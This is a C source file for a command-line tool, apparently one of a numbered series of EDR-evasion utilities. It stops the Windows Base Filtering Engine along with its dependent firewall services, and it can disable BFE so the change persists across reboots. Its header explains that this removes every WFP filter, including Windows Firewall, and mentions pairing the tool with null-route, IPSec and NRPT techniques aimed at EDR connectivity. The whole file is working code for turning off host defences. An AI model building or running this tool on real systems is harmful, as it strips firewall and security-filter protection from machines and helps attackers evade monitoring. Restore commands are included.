/*
 * 12_bfe_stop.c
 * BFE (Base Filtering Engine) Service Disruption
 *
 * Stops the BFE service, which is the usermode engine for WFP.
 * When BFE stops, all WFP filters are removed and filter evaluation stops.
 * All network traffic flows without any WFP restrictions.
 *
 * Effects:
 *   - All WFP filters (including Windows Firewall) are disabled
 *   - MsSense.exe, Sense service can still connect to EDR cloud
 *   - But if used in conjunction with null-route/IPSec/NRPT — those remain
 *   - Windows Defender also depends on BFE — this is highly visible
 *
 * Four operations:
 *   stop     — stop BFE (and dependents: mpssvc, mpsdrv)
 *   disable  — set BFE start type to DISABLED (persists across reboots)
 *   start    — re-start BFE
 *   enable   — set BFE start type back to AUTO_START
 *
 * Build:
 *   cl 12_bfe_stop.c /link Advapi32.lib
 *
 * Usage:
 *   12_bfe_stop.exe stop
 *   12_bfe_stop.exe disable
 *   12_bfe_stop.exe start
 *   12_bfe_stop.exe enable
 *   12_bfe_stop.exe status
 */

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <stdio.h>
#include <wchar.h>

#pragma comment(lib, "Advapi32.lib")

/* Services that depend on BFE; must be stopped first */
static const WCHAR *BFE_DEPENDENTS[] = {
    L"mpssvc",   /* Windows Defender Firewall */
    L"mpsdrv",   /* Windows Defender Firewall Driver */
    L"SharedAccess", /* Internet Connection Sharing */
    NULL
};

static BOOL StopService(SC_HANDLE hScm, const WCHAR *svcName)
{
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
                                   SERVICE_STOP | SERVICE_QUERY_STATUS);
    if (!hSvc) return FALSE;

    SERVICE_STATUS ss = {0};
    QueryServiceStatus(hSvc, &ss);
    if (ss.dwCurrentState == SERVICE_STOPPED) {
        CloseServiceHandle(hSvc);
        return TRUE;
    }

    BOOL ok = ControlService(hSvc, SERVICE_CONTROL_STOP, &ss);
    if (ok) {
        /* Wait up to 10s for stop */
        for (int i = 0; i < 100; i++) {
            Sleep(100);
            QueryServiceStatus(hSvc, &ss);
            if (ss.dwCurrentState == SERVICE_STOPPED) break;
        }
        wprintf(L"  [+] Stopped: %s\n", svcName);
    } else {
        wprintf(L"  [-] Could not stop %s: %lu\n", svcName, GetLastError());
    }

    CloseServiceHandle(hSvc);
    return ok;
}

static BOOL StartSvc(SC_HANDLE hScm, const WCHAR *svcName)
{
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
                                   SERVICE_START | SERVICE_QUERY_STATUS);
    if (!hSvc) {
        wprintf(L"  [-] OpenService %s failed: %lu\n", svcName, GetLastError());
        return FALSE;
    }

    SERVICE_STATUS ss = {0};
    QueryServiceStatus(hSvc, &ss);
    if (ss.dwCurrentState == SERVICE_RUNNING) {
        wprintf(L"  [~] Already running: %s\n", svcName);
        CloseServiceHandle(hSvc);
        return TRUE;
    }

    BOOL ok = StartServiceW(hSvc, 0, NULL);
    if (ok || GetLastError() == ERROR_SERVICE_ALREADY_RUNNING) {
        wprintf(L"  [+] Started: %s\n", svcName);
        ok = TRUE;
    } else {
        wprintf(L"  [-] StartService %s failed: %lu\n", svcName, GetLastError());
    }
    CloseServiceHandle(hSvc);
    return ok;
}

static BOOL SetStartType(SC_HANDLE hScm, const WCHAR *svcName, DWORD startType)
{
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName, SERVICE_CHANGE_CONFIG);
    if (!hSvc) {
        wprintf(L"  [-] OpenService %s failed: %lu\n", svcName, GetLastError());
        return FALSE;
    }

    BOOL ok = ChangeServiceConfigW(
        hSvc,
        SERVICE_NO_CHANGE,   /* type */
        startType,           /* start type */
        SERVICE_NO_CHANGE,   /* error control */
        NULL, NULL, NULL, NULL, NULL, NULL, NULL
    );

    if (ok) {
        wprintf(L"  [+] %s start type changed\n", svcName);
    } else {
        wprintf(L"  [-] ChangeServiceConfig %s: %lu\n", svcName, GetLastError());
    }
    CloseServiceHandle(hSvc);
    return ok;
}

static void ShowStatus(SC_HANDLE hScm, const WCHAR *svcName)
{
    SC_HANDLE hSvc = OpenServiceW(hScm, svcName,
                                   SERVICE_QUERY_STATUS | SERVICE_QUERY_CONFIG);
    if (!hSvc) {
        wprintf(L"  %-20s  [cannot open]\n", svcName);
        return;
    }

    SERVICE_STATUS ss = {0};
    QueryServiceStatus(hSvc, &ss);

    QUERY_SERVICE_CONFIGW *pCfg = NULL;
    DWORD cbNeeded = 0;
    QueryServiceConfigW(hSvc, NULL, 0, &cbNeeded);
    if (cbNeeded > 0) {
        pCfg = (QUERY_SERVICE_CONFIGW *)HeapAlloc(GetProcessHeap(), 0, cbNeeded);
        QueryServiceConfigW(hSvc, pCfg, cbNeeded, &cbNeeded);
    }

    const WCHAR *state = L"UNKNOWN";
    switch (ss.dwCurrentState) {
        case SERVICE_RUNNING:       state = L"RUNNING";  break;
        case SERVICE_STOPPED:       state = L"STOPPED";  break;
        case SERVICE_START_PENDING: state = L"STARTING"; break;
        case SERVICE_STOP_PENDING:  state = L"STOPPING"; break;
        case SERVICE_PAUSED:        state = L"PAUSED";   break;
    }

    const WCHAR *startType = L"?";
    if (pCfg) {
        switch (pCfg->dwStartType) {
            case SERVICE_BOOT_START:   startType = L"BOOT";     break;
            case SERVICE_SYSTEM_START: startType = L"SYSTEM";   break;
            case SERVICE_AUTO_START:   startType = L"AUTO";     break;
            case SERVICE_DEMAND_START: startType = L"DEMAND";   break;
            case SERVICE_DISABLED:     startType = L"DISABLED"; break;
        }
        HeapFree(GetProcessHeap(), 0, pCfg);
    }

    wprintf(L"  %-20s  %-10s  Start=%-8s\n", svcName, state, startType);
    CloseServiceHandle(hSvc);
}

int wmain(int argc, wchar_t *argv[])
{
    wprintf(L"[*] BFE Service Control Tool\n\n");

    if (argc < 2) {
        wprintf(L"Usage:\n");
        wprintf(L"  %s stop      Stop BFE (and dependent firewall services)\n", argv[0]);
        wprintf(L"  %s disable   Set BFE to DISABLED start type\n", argv[0]);
        wprintf(L"  %s start     Start BFE\n", argv[0]);
        wprintf(L"  %s enable    Set BFE back to AUTO start type\n", argv[0]);
        wprintf(L"  %s status    Show current state of BFE and dependents\n", argv[0]);
        return 1;
    }

    SC_HANDLE hScm = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hScm) {
        wprintf(L"[-] OpenSCManager failed: %lu\n", GetLastError());
        wprintf(L"[-] Run as Administrator.\n");
        return 1;
    }

    int ret = 0;

    if (_wcsicmp(argv[1], L"status") == 0) {
        wprintf(L"  %-20s  %-10s  %s\n", L"Service", L"State", L"StartType");
        wprintf(L"  %-20s  %-10s  %s\n", L"-------", L"-----", L"---------");
        ShowStatus(hScm, L"bfe");
        for (int i = 0; BFE_DEPENDENTS[i] != NULL; i++)
            ShowStatus(hScm, BFE_DEPENDENTS[i]);
        goto done;
    }

    if (_wcsicmp(argv[1], L"stop") == 0) {
        wprintf(L"[*] Stopping dependent services first...\n");
        for (int i = 0; BFE_DEPENDENTS[i] != NULL; i++)
            StopService(hScm, BFE_DEPENDENTS[i]);

        wprintf(L"\n[*] Stopping BFE...\n");
        if (!StopService(hScm, L"bfe")) {
            wprintf(L"[-] Failed to stop BFE.\n");
            ret = 1;
        } else {
            wprintf(L"\n[+] BFE stopped.\n");
            wprintf(L"[!] All WFP filters are now disabled.\n");
            wprintf(L"[!] Windows Firewall is non-functional.\n");
        }
        goto done;
    }

    if (_wcsicmp(argv[1], L"disable") == 0) {
        wprintf(L"[*] Setting BFE start type to DISABLED...\n");
        SetStartType(hScm, L"bfe", SERVICE_DISABLED);
        wprintf(L"[+] BFE will not start on next reboot.\n");
        wprintf(L"[!] Run 'enable' + 'start' to recover.\n");
        goto done;
    }

    if (_wcsicmp(argv[1], L"start") == 0) {
        wprintf(L"[*] Starting BFE...\n");
        if (!StartSvc(hScm, L"bfe")) {
            wprintf(L"[-] Failed. Possibly disabled — run 'enable' first.\n");
            ret = 1;
            goto done;
        }
        wprintf(L"[*] Starting dependent services...\n");
        for (int i = 0; BFE_DEPENDENTS[i] != NULL; i++)
            StartSvc(hScm, BFE_DEPENDENTS[i]);
        wprintf(L"\n[+] BFE and dependents started. WFP filters are active.\n");
        goto done;
    }

    if (_wcsicmp(argv[1], L"enable") == 0) {
        wprintf(L"[*] Setting BFE start type to AUTO...\n");
        SetStartType(hScm, L"bfe", SERVICE_AUTO_START);
        wprintf(L"[+] BFE will auto-start on next reboot.\n");
        goto done;
    }

    wprintf(L"[-] Unknown command: %s\n", argv[1]);
    ret = 1;

done:
    CloseServiceHandle(hScm);
    return ret;
}
